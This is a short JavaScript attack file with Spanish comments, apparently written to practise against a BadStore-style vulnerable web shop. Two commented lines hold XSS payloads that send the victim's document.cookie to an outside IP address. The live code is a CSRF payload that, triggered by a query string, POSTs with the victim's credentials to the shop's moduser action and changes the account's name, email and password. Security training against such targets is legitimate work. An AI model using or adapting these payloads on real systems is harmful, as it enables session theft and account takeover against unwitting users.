//<script>alert(await fetch("http://200.200.100.10:8090?cookie="+document.cookie))</script>
//{/* <script>document.addEventListener("DOMContentLoaded", async () => { await fetch("http://200.200.100.10:8090?valor=aqui") }) </script> */}


document.addEventListener("DOMContentLoaded", () => {
    Payload();
});

function Payload()
{
    try {
        let url = window.location.search.split("=")[1];
    
        //cuando exista el query string => ?action=cambiarCuenta [*] se ejecuta nuestro csrf2 para cambiar cuenta de usuario.
        if(url.trim() === "cambiarCuenta" && url != undefined)
        {
            CambioDeCuenta();
            
        }else {
            console.log("error");
        }
    } catch (error) {
        console.log("error");
    }
}

async function CambioDeCuenta(){
    await fetch("http://www.bladstore.net/cgi-bin/badstore.cgi?action=moduser", {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded' 
            },
            credentials: "include",
            body: "fullname=HACKEADO_ANONIMO&newemail=juan%40hotmail.com&newpasswd=anonimo&vnewpasswd=anonimo&role=U&email=juan%40hotmail.com&DoMods=Change+Account"
        })
        .then(response => response.json())
        .then(data => console.log(data));
}

